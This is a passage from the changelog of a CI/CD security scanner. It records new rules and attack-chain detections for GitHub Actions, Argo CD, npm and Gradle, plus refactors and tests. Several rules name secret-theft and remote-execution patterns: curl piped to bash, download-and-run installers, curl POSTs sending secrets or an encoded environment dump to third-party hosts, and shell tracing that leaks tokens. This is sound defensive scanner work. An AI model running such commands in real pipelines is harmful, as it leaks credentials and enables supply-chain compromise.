  PR.AA-01 / PR.DS-01; SOC2 CC6.1; PCI-DSS v4 8.2.1 / 10.3.2.
  Github provider check count 66 -> 67.
- **GHA-086: wildcard branch trigger gates an environment-bound
  deploy.** New github-provider rule, MEDIUM severity. Fires when
  the workflow's ``on: push: branches:`` filter contains at least
  one wildcard pattern (``*``, ``?``, ``+``, ``[...]``) AND at least
  one job binds ``environment: <name>``. Catches cicd-goat scenario
  25 (deployment-branches-rule bypass): a contributor with push
  access creates ``main-anything``, the ``branches: ['main*']``
  pattern matches, the ``environment: production`` reviewer prompt
  fires on a generic ``production`` deploy without surfacing the
  diff. Workflow-side half of the bypass; the matching protection
  rule lives in repo settings out of YAML reach but is meaningless
  without the trigger half. Pairs with GHA-014 (deploy job missing
  environment binding); together they cover both halves of the
  deployment-gate surface. ``branches-ignore`` (restricting
  triggers) and ``tags:`` (higher-privilege creation) are
  deliberately not flagged. 14 per-rule tests under
  ``tests/github/test_gha086.py`` plus the standard safe/unsafe
  fixture pair. OWASP CICD-SEC-1 / CICD-SEC-5; ESF-C-APPROVAL /
  ESF-C-ENV-SEP; CIS 5.1.4 / 5.2.1. Github provider check count
  65 -> 66.
- **Local composite-action scanning.** ``GitHubContext.from_path``
  now walks each loaded workflow for ``uses: ./path`` references
  (``parse_uses`` ``kind="local-action"``), resolves
  ``<repo_root>/<path>/action.yml`` (or ``action.yaml``) on disk,
  and synthesizes the body as a ``__composite__`` job so the full
  GHA rule pack runs against the action's ``runs.steps``. Mirrors
  what the ``--resolve-remote`` resolver path already does for
  *remote* composite actions, but operates entirely on disk and is
  on by default (no network, no opt-in). Repo-root inference handles
  the canonical ``<root>/.github/workflows`` layout and falls back
  to the directory's parent for ad-hoc test layouts; missing
  ``action.yml`` files produce a dedup'd warning rather than a
  scan failure; ``./../path`` traversal attempts are bounded against
  the resolved repo root; composite-of-composite chains recurse to
  depth 3 (hard ceiling 10). Closes cicd-goat scenario 18
  (composite-action ``${{ inputs.* }}`` injection): GHA-003 fires on
  the synthesized composite step whose ``run:`` interpolates
  ``${{ inputs.<name> }}``. Twelve new tests under
  ``tests/github/test_local_composite_actions.py`` cover the
  positive shape, non-composite skip (``node20`` / ``docker``),
  missing-file warning, path-traversal rejection,
  composite-of-composite recursion, multi-caller dedup, both
  ``action.yml`` / ``action.yaml`` extensions, and the three repo-
  root inference layouts.
- **MCP server caught up with the v1.3 provider pack + PR-diff
  mode.** The ``--serve`` MCP catalog now advertises every provider
  the rule registry exposes (23, up from 18); ``argocd``, ``maven``,
  ``npm``, ``pypi``, and ``scm`` were missing from
  ``_PROVIDER_PATH_KW`` / ``_RULES_FQN`` and silently fell out of
  every ``list_providers`` / ``list_checks`` / ``scan`` call.
  ``aws``, ``cloudformation``, ``terraform``, and ``helm`` were also
  missing from ``_RULES_FQN``, so ``list_checks(provider=<X>)``
  raised "unknown provider" for them. Both maps are now aligned, and
  ``tests/test_mcp_server.py`` locks the MCP catalog to
  ``scripts/gen_provider_docs.py``'s ``SUPPORTED_PROVIDERS`` so the
  next provider addition fails CI if the MCP wiring is missed. The
  ``scm`` provider's path-less shape is surfaced as
  ``scm_platform`` / ``scm_repo`` / ``scm_fixture_dir`` properties
  on ``scan`` / ``inventory`` / ``threat_model`` / ``scan_markdown``.
  A new ``scan_pr_diff`` tool wraps the ``--pr-diff REF`` flow end-
  to-end (HEAD in-process, BASE in a throwaway ``git worktree``
  subprocess, partition into introduced / resolved / preserved with
  multiset semantics, return the structured delta plus the rendered
  Markdown PR comment). ``scan`` also picked up a ``diff_base``
  parameter mirroring the CLI's branch-scoped file filter. Live
  providers (``aws`` / ``scm``) are rejected up front for
  ``scan_pr_diff`` since neither has a meaningful local BASE ref.
- **`--pr-diff REF` PR-time delta mode.** New CLI flag that
  re-scans both sides of a PR (HEAD in-process, REF in a throwaway
  ``git worktree`` subprocess) and emits a Markdown PR-comment
  naming which findings the branch introduced, resolved, or
  preserved. Multiset fingerprint on ``(check_id, resource)``
  (path-normalized, line-independent), so a second occurrence of
  the same rule on a file that already had one surfaces as
  introduced, and line shifts on otherwise-unchanged code don't.
  Combine with ``--fail-on SEV`` to gate the PR on *introduced*
  findings only; without ``--fail-on`` the mode is informational
  and always exits 0. Mutually exclusive with ``--inventory-only``,
  ``--fix``, ``--baseline*``, and ``--diff-base``. Degraded modes
  (unresolvable ref, worktree failure, subprocess JSON parse) emit
  a ``[!WARNING]`` callout and treat every HEAD finding as
  introduced, so a CI lane behind a shallow fetch still produces
  visible diff output. Full recipe + limits in
  [docs/pr_diff.md](docs/pr_diff.md).
- **Gradle multi-project ``rootProject.ext.X`` resolution.** The
  maven provider's Gradle path now resolves cross-project property
  references. ``MavenContext.from_path`` walks upward from each
  ``build.gradle`` / ``build.gradle.kts`` looking for a
  ``settings.gradle`` / ``settings.gradle.kts`` marker to identify
  the multi-project root, reads the root's build script for
  ``ext { X = ... }`` / ``ext.X = ...`` / ``def X`` / ``val X``
  declarations, and exposes each value under both
  ``rootProject.ext.X`` and ``rootProject.X`` accessor keys.
  Subproject version specs like ``"org.apache.logging.log4j:log4j-
  core:${rootProject.ext.log4jVersion}"`` now resolve before the
  MVN-NNN rules see them, closing the last remaining gap in the
  Dependency-supply-chain provider follow-ups noted in ROADMAP.md.
  Single-project layouts (no settings file) keep their existing
  silent-pass behavior; the root's own build script continues to
  resolve via in-file extraction, so the ``rootProject.*`` alias
  path doesn't double-apply.
- **AC-031 attack chain — Argo CD untrusted PR generator meets
  wildcard source repos.** New CRITICAL-severity chain pairing
  ARGOCD-006 (ApplicationSet ``pullRequest`` / ``scmProvider``
  generator without a project allowlist or
  ``filters:`` / ``labels:`` constraint) with ARGOCD-001
  (AppProject ``sourceRepos: ['*']``). Composite: a contributor PR
  in the matched org materializes a fresh ``Application`` under a
  project whose source-repo allowlist is unbounded, the controller
  renders the attacker-supplied manifests into the cluster on the
  next sync. The default out-of-the-box AppProject ships with
  ``sourceRepos: ['*']``, so the chain fires on most Argo CD
  installs where a PR generator is introduced without a tightened
  project. MITRE T1195.002 / T1199 / T1078.004. Chain count
  40 -> 41.
- **AC-030 attack chain — Argo CD anonymous access meets wildcard
  RBAC.** New CRITICAL-severity chain pairing ARGOCD-009
  (``argocd-cm`` sets ``users.anonymous.enabled: "true"``) with
  ARGOCD-004 (``argocd-rbac-cm`` carries a wildcard ``p, <role>, *,
  *, *, allow`` policy or a ``g, <subject>, role:admin`` binding).
  Either leg alone is real; together they collapse to a zero-auth
  control-plane takeover, an unauthenticated caller resolves through
  the anonymous principal into the broad RBAC grant and drives Argo
  CD's sync engine, the manifests it applies, and every credential
  its application controllers can read. MITRE T1190 / T1078.001 /
  T1098.003; closes the missing attack-chain coverage on the v1.3.0
  Argo CD provider pack. The hand-edited table in
  ``docs/attack_chains.md`` also picked up the missing AC-028 and
  AC-029 rows the v1.3.0 cycle never backfilled. Chain count 39 ->
  40.
- **XPC-010 attack chain — npm cooldown miss meets Dockerfile
  lifecycle execution.** New cross-provider chain pairing NPM-008
  (a ``package.json`` pinned a direct dependency to an exact
  version published inside the cooldown window) with DF-024 (the
  Dockerfile's ``npm`` / ``yarn`` / ``pnpm install`` line runs
  lifecycle scripts). Either leg alone is bounded, NPM-008 is a
  time-window signal, DF-024 is an execution-primitive signal,
  together they are the consumer-side Shai-Hulud / TanStack
  topology, the next ``npm ci`` inside the build container
  resolves a freshly published version AND executes its
  ``postinstall`` with ``NPM_TOKEN`` / ``GH_TOKEN`` / ``AWS_*``
  in scope. Severity HIGH, MITRE T1195.002 / T1078.004 / T1546.
  Fires on ``--pipelines npm,dockerfile`` (or any multi-provider
  run that includes both legs) with ``--resolve-remote`` enabled
  for NPM-008's publish-time metadata. Chain count 38 -> 39.
- **Argo CD provider with a 9-rule pack.** New ``--pipeline argocd``
  parses ``Application`` / ``ApplicationSet`` / ``AppProject`` CRDs
  plus the ``argocd-cm`` / ``argocd-rbac-cm`` ConfigMaps, distinct
  from the existing ``argo`` (Argo Workflows) provider so
  ``--pipelines argo,argocd`` against one directory produces
  non-overlapping findings. ARGOCD-001 AppProject ``sourceRepos: '*'``;
  ARGOCD-002 AppProject wildcard destinations; ARGOCD-003 auto-sync
  ``prune: true`` without ``selfHeal``; ARGOCD-004 ``argocd-rbac-cm``
  policies granting wildcard authority; ARGOCD-005 ``argocd-cm`` repo
  entries storing plaintext credentials; ARGOCD-006 ApplicationSet
  PR / SCM generators without a project allowlist; ARGOCD-007 Helm
  ``valueFiles`` / parameters using generator placeholders without
  ``spec.goTemplate: true``; ARGOCD-008 Application invoking a
  config-management plugin (CMP); ARGOCD-009 ``argocd-cm`` with
  anonymous access enabled. Standards mappings added in
  ``owasp_cicd_top_10``, ``cis_supply_chain``, and
  ``esf_supply_chain``. Provider count 22 -> 23; total-check claim
  810+ -> 820+.

### Changed

- **README provider-table per-row drift guard.**
  ``tests/test_doc_claims.py`` now verifies every row in the
  README's Supported-providers table declares a leading
  ``<N> checks`` figure equal to the rule-file count under that
  provider's ``rules/`` directory. The Helm row is covered by a
  dedicated assertion since its cell carries a composite
  ``<N> K8S-* + <M> HELM-*`` claim. Mirrors the existing
  ``test_comparison_per_row_rule_counts_match_registry`` guard
  for ``docs/comparison.md``. Catches the drift that bit the
  v1.3.0 cycle on multiple PRs, contributor adds rules to a
  provider but forgets to bump the README table cell.
- **Doc-claim drift guard extended to CONTRIBUTING.md + Docker Hub
  README.** ``tests/test_doc_claims.py`` now scans
  ``CONTRIBUTING.md`` and ``.github/DOCKERHUB.md`` alongside the
  original README / docs/index / action.yml / pyproject /
  mkdocs.yml surfaces. Surfaced two pre-existing drifts at landing
  time, ``CONTRIBUTING.md`` claimed "22 providers" (current 23)
  and the Docker Hub README claimed "19 providers" / "590+ checks"
  (current 23 / 820+); both bumped. Docker Hub README also
  reworded from "23 CI/CD and infrastructure providers" to "23
  providers (CI/CD and infrastructure)" so the regex
  (``\b\d+\s+(?:CI/CD\s+)?providers?\b``) actually matches the
  claim, the original phrasing would have left a hole in
  enforcement.
- **Reachability-model carve-out backfill on cross-provider chains.**
  XPC-001 / XPC-003 / XPC-004 / XPC-005 / XPC-006 / XPC-007 /
  XPC-008 / XPC-009 module docstrings now carry an explicit
  "Reachability-model carve-out" section documenting why each
  chain does not use the ``job_anchors`` intersection model and
  what the actual reachability claim is (per-scan co-occurrence
  for cross-document chains, with per-chain prose tied to the
  specific resource shapes the two legs emit). Closes the
  "backfilling those notes is a follow-up" item in the
  Reachability-aware attack chains section of ROADMAP.md. No
  behavior change, the carve-outs are documentation prose only.

### Fixed

- **Autofix quality pass on four workflow-breaking fixers.**
  (1) ``_fix_gha015`` no longer inserts ``timeout-minutes: 30``
  into reusable-workflow caller jobs (``jobs.<id>.uses:``), GitHub
  Actions rejects that key on those jobs at runtime, and the
  GHA-015 rule already exempted them. (2) ``_fix_npm_ci`` now
  rewrites only the bare/flag-less ``npm install`` form, leaving
  ``npm install --global typescript`` / ``npm install <pkg>`` /
  ``npm install -g foo`` alone, ``npm ci`` rejects package args
  and the rule's ``PKG_NO_LOCKFILE_RE`` already exempted
  ``-g``/``--global``. (3) ``_strip_docker_flags`` and
  ``_strip_pkg_flags`` no longer collapse the YAML leading indent,
  the post-strip space-compaction regex was matching runs of 2+
  spaces anywhere on the line (including the indent) which made
  the safety net bail on every multi-space-indented step;
  switched to a ``(?<=\S)  +`` lookbehind so only internal
  whitespace collapses. (4) ``_fix_gha003`` emits the ``env:``
  block at the column of the ``run:`` key rather than the column
  of the command body, fixing the common ``  - run: <cmd>``
  shape where the previous indent put ``env:`` deeper than its
  parent step and tripped the safety net.

## [1.3.0] - 2026-05-21

### Added

- **CLI hint — npm provider not covered alongside github.** When
  ``--pipeline github`` is invoked alone in a repo that also ships
  one or more ``package.json`` files outside ``node_modules`` /
  ``vendor`` / ``dist`` / build directories, the CLI now emits a
  ``[hint]`` line on stderr nudging the user to add an
  ``--pipeline npm --npm-path <dir>`` invocation per manifest (or
  ``--pipelines github,npm`` when a manifest sits at cwd).
  Dependency-confusion / floating-range / lockfile-integrity issues
  live in the manifest, not the workflow YAML, and the github
  pipeline only inspects the latter. Closes the
  ``greylag-ci/cicd-goat`` scenario 20 visibility gap. Walk is
  depth-bounded (3 levels) and skips the usual heavy directories so
  the check costs no perceptible time on real repos.
- **GHA-016 trusted-installer (Codecov 2021) shape.** Widens the
  rule from ``curl | bash`` plus its in-primitive variants
  (shell-subshell, python-inline, download-exec, PowerShell) to also
  fire when a job downloads an executable from a non-vendor host
  (``curl -o``, ``wget -O``, ``curl > file``) AND any subsequent
  step in the same job runs that file (``./file``, ``chmod +x``,
  ``bash file.sh``). The shape fires even when the body verifies a
  SHA256 checksum or GPG signature; the original Codecov compromise
  shipped a malicious uploader signed by the publisher's own
  (compromised) CI. The carve-out is an upstream-attested
  provenance reference in the same job
  (``slsa-verifier verify-artifact``, ``gh attestation verify``,
  ``cosign verify-attestation``, ``in-toto-verify``). The existing
  vendor allowlist (``rustup.rs`` / ``get.docker.com`` / etc.) still
  exempts those installers. Closes the ``greylag-ci/cicd-goat``
  scenario 19 gap.
- **TAINT-002 matrix-expansion injection.** Extends the GitHub
  taint graph with two new propagation hops, both motivated by the
  GitHub Security Lab matrix-expansion-injection writeup:

  1. **Step env-var binding.** A producer step with
     ``env: { LABELS: "${{ toJSON(github.event.pull_request.labels.*"
     ".name) }}" }`` and a run body that writes
     ``echo "targets=$LABELS" >> $GITHUB_OUTPUT`` propagates taint
     from the env binding into the output — even though the run
     body's RHS doesn't contain a literal ``${{ ... }}`` token. This
     is the indirect-env shape GHA-003 deliberately treats as safe
     (quoted shell) but that still flows into downstream sinks.
  2. **Matrix expansion via ``fromJSON``.** When
     ``strategy.matrix.<axis>: ${{ fromJSON(needs.<job>.outputs.<name>) }}``
     feeds a tainted upstream output, every
     ``${{ matrix.<axis> }}`` reference in the consuming job's run /
     with body is treated as a taint sink. The path renderer shows
     the full chain (source -> env binding -> step output -> job
     output -> fromJSON matrix axis -> sink) so the reviewer sees the
     whole expansion at once.

  ``UNTRUSTED_CONTEXT_RE`` also widened to accept
  ``toJSON(...)`` / ``fromJSON(...)`` / ``format(...)`` wrappers
  around the untrusted context expression, and to recognize
  ``github.event.pull_request.labels.*.name`` /
  ``.description`` as untrusted (labels are PR-author or
  labeler-controlled). Closes the ``greylag-ci/cicd-goat``
  scenario 21 gap.
- **GHA-049 actions-bot-bypass shape.** Widens the rule from
  "cross-repo push from CI" (parameterized destinations only) to
  also fire when a workflow's run body assumes the
  ``github-actions[bot]`` identity (``git config user.name
  "github-actions[bot]"`` / the noreply email / the legacy
  ``actions-user`` spelling) AND issues any ``git push`` in the
  same job. The combination is the canonical
  branch-protection-bypass-allowance abuse shape: GitHub's
  documented operational convenience is to list
  ``github-actions[bot]`` in
  ``Allow specified actors to bypass required pull requests`` on
  the default branch, after which any workflow that adopts that
  identity can push to ``main`` without review. The full
  branch-protection-side audit lives in SCM-018 / SCM-019 (run via
  ``--scm-platform github``); this leg flags the workflow that's
  pre-positioned to exploit the SCM gap. Title updated to reflect
  the broader scope. Closes the ``greylag-ci/cicd-goat`` scenario
  23 gap.
- **GHA-019 ArtiPACKED shape.** Widens the rule from
  "GITHUB_TOKEN written to a file / ``$GITHUB_ENV`` / ``tee``" to
  also pair ``actions/checkout`` (default
  ``persist-credentials: true``) with a downstream
  ``actions/upload-artifact`` whose ``path:`` covers the repo root
  (``.``, ``./``, ``${{ github.workspace }}``, or an explicit
  ``.git/`` reference). The checkout writes the runtime
  ``GITHUB_TOKEN`` into ``.git/config`` via ``extraheader``; the
  upload bundles ``.git/`` into the artifact, so anyone with read
  access to the run can ``gh run download`` and grep the token out.
  The ordering requirement (checkout must precede upload) keeps a
  preexisting upload of an unrelated tree from firing the rule.
  Closes the ``greylag-ci/cicd-goat`` scenario 17 gap — the
  Palo Alto Unit 42 ArtiPACKED pattern.
- **GHA-033 shell-trace shape.** Widens the rule from
  "echo / printf / cat / tee / print of a secret context expression
  or secret-bound env var" to also fire when the step enables
  ``set -x`` / ``set -o xtrace`` (or any ``set`` bundle with the
  ``x`` flag, e.g. ``set -euxo pipefail``) AND references a
  secret-bound env var anywhere in the body. Shell trace mode
  dumps each command with arguments expanded before execution, so a
  ``curl -H "Bearer $TOKEN"`` line that would normally stay out of
  the log lands verbatim. Closes the ``greylag-ci/cicd-goat``
  scenario 27 gap. The carve-out for inline ``${{ secrets.* }}`` in
  curl arguments without shell trace stands (curl doesn't echo its
  args; that's GHA-057's domain).
- **GHA-008 keyed-hex detector.** A second, always-on pass in
  ``_secrets.py`` fires on a 40-char lowercase-hex value bound to a
  credential-named YAML key (``LEGACY_API_TOKEN: deadbeef...0ddf00d``).
  Covers the legacy-unprefixed-vendor-token family (Datadog, GitLab v1
  PATs, Codecov v3, AppVeyor, CircleCI v1, pre-``ghp_`` GitHub PATs)
  where the bare hex shape carries no vendor prefix. The
  credential-key gate keeps commit SHAs and SHA-256 digests out: a
  40-hex in ``deploy_commit:`` doesn't fire. Closes the
  ``greylag-ci/cicd-goat`` scenario 15 gap (KICS catches that shape;
  pipeline-check previously didn't).
- **GHA-057 third-party-webhook exfil shape.** Widens the rule from
  "secret-scanner output piped to egress" to also fire on
  ``curl`` / ``wget`` / ``httpie`` POST/PUT/PATCH (or
  ``--data`` upload) to a non-GitHub host whose payload references
  ``${{ secrets.* }}``, a credential-named env var
  (``$GITHUB_TOKEN``, ``$NPM_TOKEN``, ``$AWS_*``, etc.), or dumps the
  runner env (``$(env)``, ``$(printenv)``). GitHub-owned hosts plus
  Codecov / npm / PyPI allowlisted. Closes the
  ``greylag-ci/cicd-goat`` scenario 24 gap, where a build-telemetry
  ``curl POST`` exfils ``$(env | base64)`` to a third-party tracker
  domain that, if it lapses or gets breached, leaks every downstream
  build's runtime env.
- **GHA-062 — sibling IaC pins an over-broad OIDC subject claim.**
  When a workflow uses ``aws-actions/configure-aws-credentials`` or
  ``google-github-actions/auth``, GHA-062 walks the containing repo
  (depth-bounded, skipping ``node_modules`` / ``vendor`` / build
  dirs) for two sidecar IaC shapes:

  - ``*trust-polic*.json`` files referencing
    ``token.actions.githubusercontent.com`` as a Federated principal
    whose ``Condition.StringLike :sub`` is ``repo:*`` or
    ``repo:<org>/*`` (matches more than one repo);
  - ``*.tf`` files containing a
    ``google_iam_workload_identity_pool_provider`` block whose
    ``attribute_condition`` is
    ``attribute.repository.startsWith('<org>/')`` (whole-org WIF
    binding).

  GHA-030 already covers the workflow-side environment binding;
  this leg covers the IaC subject claim that actually accepts the
  OIDC token. Closes the ``greylag-ci/cicd-goat`` scenarios 10 (AWS
  wildcard sub) and 22 (GCP over-broad WIF) gaps — the workflow
  itself is environment-bound in both scenarios, so GHA-030
  correctly stays silent; the bug lives in the sibling IaC, and
  GHA-062 finds it.
- **GHA-061 — GitHub App token minted without a ``permissions:``
  filter.** ``actions/create-github-app-token``,
  ``tibdex/github-app-token``, and
  ``peter-murray/workflow-application-token-action`` accept a
  ``permissions:`` input that scopes the minted installation
  token. When the input is missing the runtime token inherits
  every permission the App's install grants on the org, which is
  commonly broader than the consuming job needs (``contents: write,
  packages: write, actions: write, pull-requests: write, ...``).
  The new rule fires on any minting step whose ``with:`` block
  has no non-empty ``permissions`` entry. Closes scenario 26 of
  the ``greylag-ci/cicd-goat`` matrix (GHA-050 was previously
  declared on that scenario by mistake; GHA-050 covers publish
  steps, not App-token mints).

### Changed

- **Blob-rule factory collapses per-provider clone clusters.**
  ``_primitives/blob_rule.py`` ships a ``yaml_blob_check`` factory
  that takes a ``Rule``, a blob ``scanner``, and pass/fail prose, and
  returns the ``check(path, doc)`` callable the orchestrator
  consumes. Four cross-provider rule families (``dep_update``,
  ``tls_bypass``, ``pkg_insecure``, ``docker_insecure``) and the
  ``malicious_activity`` cluster migrate onto the factory, shrinking
  25 rule modules by ~190 lines net and removing the
  per-provider boilerplate that previously had to be re-pasted for
  every new "applies to every CI provider" rule. Provider-specific
  shapes that need step iteration (BK-008, DR-006), step-level
  ``Location`` anchors (GHA-017), or Jenkinsfile text input
  (JF-017 / JF-018 / JF-022 / JF-023 / JF-029) keep their bespoke
  check bodies. ``_malicious.summarize_malicious_hits`` centralizes
  the shared "N indicator(s) (categories). Examples: ..." prose so
  it can't drift between providers.
- **GHA-004 OIDC allowlist widened.** ``ossf/scorecard-action``
  consumes ``id-token: write`` when ``publish_results: true`` posts
  the score to the OpenSSF Scorecard API, and
  ``docker/build-push-action`` consumes it when ``provenance:`` or
  ``sbom:`` is set (both signed via Sigstore). Both are now
  recognized so the rule stops flagging the surrounding job as
  "id-token: write with no OIDC step". Brings the dogfood ``scorecard.yml``
  and ``docker-publish.yml`` workflows down to zero false positives.
- **Legacy ``CURL_PIPE_RE`` / ``TLS_BYPASS_RE`` constants removed.**
  ``BK-004``, ``BK-008``, ``DR-006``, ``ARGO-008``, and ``TKN-008``
  migrated from the combined regexes in ``checks/base.py`` to the
  cross-provider ``_primitives.remote_script_exec`` /
  ``_primitives.tls_bypass`` detectors. The holdouts now cover the
  full helm / kubectl / ssh / docker / maven / gradle / aws bypass
  catalog the rest of the rule pack already saw, and the legacy
  constants are gone from the public ``pipeline_check.core.checks.base``
  surface. The ``_comment_tls_bypass`` autofixer routes per-line text
  through the primitive so its recall stays aligned with detection.
- **Shared ``SHA_RE`` primitive.** ``_primitives/sha_ref.py`` exports
  one canonical 40-char lowercase-hex pattern (and a case-insensitive
  variant for npm / pypi git refs); six near-identical local
  ``re.compile`` lines across the rule pack and the autofix engine
  now route through it.
- **Dogfood workflow hardening.** ``release.yml`` and ``docs.yml``
  install with ``pip install --require-hashes`` against
  ``requirements.txt`` / ``requirements-docs.txt`` (the latter
  regenerated with ``pip-compile --generate-hashes`` from a new
  ``requirements-docs.in``). Top-level ``security-events: write`` /
  ``packages: write`` / ``id-token: write`` grants on ``dogfood.yml``
  / ``docker-publish.yml`` / ``codeql.yml`` moved into per-job
  ``permissions:`` blocks; the workflow top-level holds
  ``contents: read``. Closes five entries from the dogfood
  code-scanning audit in ROADMAP.md.
- **Autofix roundtrip safety net.** ``generate_fix`` parses the
  generated patch through ``yaml.safe_load_all`` and bails (returns
  ``None``) when the result no longer parses, when the top-level
  Python type swapped (mapping → list, list → mapping), or when the
  multi-doc count changed in a true multi-doc Kubernetes manifest.
  ``None``-after (everything commented out) and Dockerfile / scalar
  inputs are deliberately permitted. A ``WARNING`` log breadcrumb
  fires on each bailout so a broken fixer is visible in ``--verbose``
  runs.
- **Autofix de-dupes provider keyword sets.** GitLab top-level
  keywords and Cloud Build top-level keywords are now imported
  from ``gitlab/base.py`` and ``cloudbuild/base.py`` directly; the
  two hand-coded copies in ``autofix/_impl.py`` are gone, so a new
  top-level key in either provider can't drift between the canonical
  set and the fixer.
- **Chain-engine breadcrumb on rule errors.** A chain rule that
  raises during ``evaluate`` no longer disappears into a silent
  ``continue``. The engine logs the chain id and traceback at
  ``WARNING`` and keeps evaluating the rest of the rules (chains
  stay additive); ``--verbose`` runs now surface broken rules
  instead of hiding them.
- **Clock-sensitive rules use a ``_now()`` indirection.** GHA-042
  (young action repo), GHA-047 (fresh action ref), NPM-008, PYPI-008,
  MVN-008, and IAM-007 each ship a module-level ``_now()`` that
  tests can ``monkeypatch.setattr`` to a frozen ``datetime`` instead
  of subtracting an extra second from the synthesized timestamp to
  dodge wall-clock drift. The GHA-042 boundary test drops the
  ``seconds=1`` workaround.
- **Narrower test-skip excepts on MCP / Helm.** Importing the MCP
  harness layer now skips on ``ImportError`` / ``ModuleNotFoundError``
  only (a scanner-side ``TypeError`` / ``AttributeError`` raises
  loudly). The Helm end-to-end smoke test skips only when
  ``HelmRenderError.__cause__`` is an ``OSError`` or
  ``subprocess.TimeoutExpired`` — broken charts, ``--helm-set``
  validation failures, and non-zero helm exits propagate.
- **Shared rule-orchestrator helpers.** ``wants_ctx_kwarg`` and
  ``apply_rule_metadata`` are promoted out of the npm / pypi /
  maven ``pipelines.py`` clones into ``checks/rule.py`` so every
  orchestrator picks up new ``Rule`` fields without per-provider
  edits.
- **``looks_like_example`` quadratic slice eliminated.** The hot-path
  YAML-ancestor walk used to re-scan ``blob[:line_start]`` on every
  candidate match (50 matches in a 5 KB blob = 50 full-prefix regex
  passes). The ``(line_start, indent, name)`` index is now built
  once per blob, cached on ``id(blob)`` like ``blob_lower``, and
  each call bisects into it. ``clear_blob_cache()`` drops both
  caches together so test isolation stays automatic.
- **Standards auto-register via ``pkgutil``.** Dropping a new module
  under ``core/standards/data/`` is enough — ``standards/__init__.py``
  walks the subpackage at import time and registers every
  ``STANDARD``. The hand-maintained 15-line ``register(_FOO)`` block
  is gone, mirroring the ``chains/engine.py:_discover()`` pattern
  the rest of the project already uses.
- **Non-circular guard on the standards docs.**
  ``test_generated_doc_in_sync`` re-runs the generator and diffs
  output — a generator bug matches both sides. The new
  ``test_standards_doc_references_every_control`` reads each
  ``docs/standards/<name>.md`` off disk and asserts every control id
  + title from the live registry appears verbatim, with no
  generator in the path. Mirrors the analogous guard
  ``test_rule_framework.py`` already carries for provider docs.
- **Narrower bare excepts in ``custom/``.** ``evaluator.py`` catches
  only ``JsonPathError`` when compiling a template's JSONPath
  fragment (other exceptions surface as bugs instead of silently
  setting ``path=None``); ``loader.py`` wraps ``OSError`` /
  ``UnicodeDecodeError`` on file read into ``CustomRuleError`` so
  the loader's fail-fast contract covers read failures the same
  way it already covers YAML and validation failures.
- **Branch coverage to 100% on argo004 + k8s017.** Two of the
  lowest-covered single-rule modules (argo's host-namespace
  podSpecPatch parser and k8s017's env-credential ``_looks_literal``
  helper) picked up the missing positive + negative tests; both
  modules are now at 100% line coverage.
- **XPC chain test boilerplate de-duped.** The nine
  ``tests/test_chain_xpcNNN.py`` modules used to carry their own
  ``_failing`` / ``_passing`` factories plus four mechanical-test
  methods verbatim (silent-on-single-leg, silent-on-neither,
  engine dispatch, confidence inheritance). The factories moved to
  ``tests/_chain_helpers.py``; the mechanical assertions live once
  in ``tests/test_chain_xpc_mechanical.py``, parametrized off a
  ``MECHANICAL_CONTRACTS`` list. Adding a new XPC chain is now one
  contract row instead of 100 lines of clone. Total surface
  shrank by ~25% (1387 → 1034 + 163 helper).
- **Session-scoped cwd / env-var pollution guard.** ``tests/conftest.py``
  now snapshots ``os.getcwd()`` + the ``PIPELINE_CHECK_*`` env
  set before every test and re-asserts at teardown. A test that
  leaks an ``os.chdir`` or an unrestored ``os.environ`` assignment
  fails fast with a pointer at the offender instead of letting
  later subprocess-based tests (e.g. ``TestExitCodeContract``)
  flake on inherited state.
- **CLI exit-code paths converge on ``click.exceptions.Exit``.**
  Every previously-direct ``sys.exit(N)`` in ``cli.py`` (list-checks
  empty-rows, ``--man`` typo, MCP harness unavailable, eager
  ``--list-chains`` / ``--explain`` / ``--ai-explain`` printers,
  ``--config-check`` fail, scan-failure traceback, gate failure,
  ``explain`` subcommand) now routes through
  ``raise click.exceptions.Exit(N)`` so programmatic callers see a
  uniform exit path and click's pre-exit callbacks still run.
  ``_tolerate_unencodable_stdio()`` also moved out of import-time
  side effects into ``main()`` so MCP / LSP callers that import
  the module without entering ``main()`` no longer inherit the
  Windows console stream reconfiguration.
- **Unmocked end-to-end CLI flag-marshalling tests.** Five new tests
  in ``tests/test_cli.py::TestFlagMarshallingEndToEnd`` exercise
  ``--output-file`` (json + sarif), ``--baseline`` (gate-relative
  filtering + missing-path error), and ``--diff-base`` (leading-dash
  rejection) against the real Scanner / reporter / gate path. The
  previously-mocked ``TestExitCodes`` / ``TestFlagWiring`` tests
  patched ``pipeline_check.cli.Scanner`` and so couldn't catch
  marshalling regressions; the new tests close that gap.
- **Real-shape boto3 fixture for IAM-003.** Four new tests in
  ``tests/aws/rules/test_iam003_real_shape.py`` use
  ``botocore.stub.Stubber`` to drive ``list_roles`` against an
  actual ``boto3.client("iam")`` with paginated responses that
  carry ``PermissionsBoundary``, exercising the field path
  LocalStack drops and the synthetic-dict tests can't authenticate.
- **Shared ``load_yaml_files`` helper.** ``checks/_yaml_files.py``
  owns the read + parse + warning-accumulation loop. Eleven
  workflow providers (``github``, ``gitlab``, ``bitbucket``,
  ``azure``, ``cloudbuild``, ``kubernetes``, ``buildkite``,
  ``drone``, ``tekton``, ``argo``, ``circleci``) now delegate
  discovery to the helper and keep only the per-doc filtering
  (e.g. ``kind: pipeline`` for Drone, ``apiVersion: tekton.dev/*``
  for Tekton). ``jenkins`` stays on its custom loop since it parses
  Groovy, not YAML.
- **Promoted ``apply_rule_metadata`` to every orchestrator.**
  The 4-line ``finding.cwe = list(rule.cwe); ...`` block was
  duplicated in ~17 class-based orchestrators (github, gitlab,
  bitbucket, azure, jenkins, circleci, cloudbuild, buildkite,
  drone, tekton, argo, dockerfile, helm, kubernetes, oci, scm,
  terraform, cloudformation, aws). Each now calls
  ``apply_rule_metadata(finding, rule)`` from
  ``checks/rule.py``. Three guarded sites (terraform, cloudformation,
  aws) had wrapped the ``cwe`` assignment in ``if not finding.cwe:``
  — switching to the unconditional shape matches the rest of the
  rule pack, where the rule's ``cwe`` is the canonical source.
- **Shared ``_primitives.registry_fetcher`` core.** The ~280
  lines of identical ``FileSystemCache`` + ``HttpGetFetcher`` +
  dedup-fetch-parse-loop machinery lived three times across
  ``npm/registry_fetcher.py``, ``pypi/registry_fetcher.py``, and
  ``maven/registry_fetcher.py``. The shared primitive owns the
  cache, transport, and loop; each per-ecosystem adapter is now a
  ~170-line wrapper around the URL builder, cache-key normalizer,
  and JSON parser specific to that registry. The public surface
  (``FileSystemCache``, ``HttpRegistryFetcher``,
  ``RegistryMetadataFetcher``, ``fetch_publish_times``,
  ``default_cache_dir``) is preserved verbatim so ``core/providers/{npm,pypi,maven}.py``
